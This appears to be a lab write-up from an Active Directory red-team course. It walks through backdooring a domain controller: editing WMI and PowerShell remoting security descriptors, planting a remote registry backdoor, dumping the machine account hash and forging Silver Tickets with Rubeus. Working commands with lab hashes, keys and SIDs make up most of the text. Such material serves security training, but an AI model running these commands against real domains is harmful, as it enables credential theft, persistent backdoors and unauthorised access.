# ⛑️ Modify security descriptors on DC & modify host security descriptors for WMI

Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. the following command modifies the host security descriptors for WMI on the DC to allow studentx access to WMI

{% hint style="info" %}
WMI provides powerful administrative capabilities, such as querying system information, modifying system configurations, and executing scripts remotely. Granting `studentx` access to WMI on a DC effectively elevates the user's privileges,
{% endhint %}

First we need to spawn a domain admin shell ->

Argsplit to encode "asktgt"

and then:

```
>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (1119).png" alt=""><figcaption></figcaption></figure>

We can now run everything we need:

```
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName student613 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>

Now, we can execute WMI queries on the DC as studentx:

```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../.gitbook/assets/image (1121).png" alt=""><figcaption></figcaption></figure>

* `gwmi`: This is an alias for the `Get-WmiObject` cmdlet in PowerShell. `Get-WmiObject` is used to retrieve management information from local and remote computers using Windows Management Instrumentation (WMI).
* `-class win32_operatingsystem`: This specifies the WMI class you are querying. The `win32_operatingsystem` class contains properties and methods related to the operating system of a computer, such as its version, name, manufacturer, configuration, and more.
* `-ComputerName dcorp-dc`: This specifies the target computer you want to query. `dcorp-dc` is the name of the remote computer from which you are retrieving the operating system information.

In summary, this command retrieves detailed information about the operating system from a computer named `dcorp-dc` using WMI.

Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it). Please note that this is unstable since some patches in August 2020:

```
Set-RemotePSRemoting -SamAccountName student613 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../../.gitbook/assets/image (1122).png" alt=""><figcaption></figcaption></figure>

Now, we can run commands using PowerShell remoting on the DC without DA privileges:

```
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

<figure><img src="../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>

Now we would want to retrieve machine account hash without DA, first we need to modify permissions on the DC. ->

```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student613 -Verbose
```

<figure><img src="../../.gitbook/assets/image (1124).png" alt=""><figcaption></figcaption></figure>

Now, we can retreive hash as student613:

```
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

<figure><img src="../../.gitbook/assets/image (1125).png" alt=""><figcaption><p>e891213dd1f921f8f3a28d80e339ef58</p></figcaption></figure>

We can now use the machine account hash to create Silver Tickets. Create Silver Tickets for HOST and RPCSS using the machine account hash to execute WMI queries ->

**rpcss**

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:e891213dd1f921f8f3a28d80e339ef58 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../.gitbook/assets/image (1126).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1127).png" alt=""><figcaption></figcaption></figure>

**host:**

```
>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:e891213dd1f921f8f3a28d80e339ef58 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

Proof that the 2 tickets are cached with klist:

<figure><img src="../../.gitbook/assets/image (1128).png" alt=""><figcaption></figcaption></figure>

And we are now able to run wmi queries on the dcorp-dc computer ->

```
gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../.gitbook/assets/image (1129).png" alt=""><figcaption></figcaption></figure>
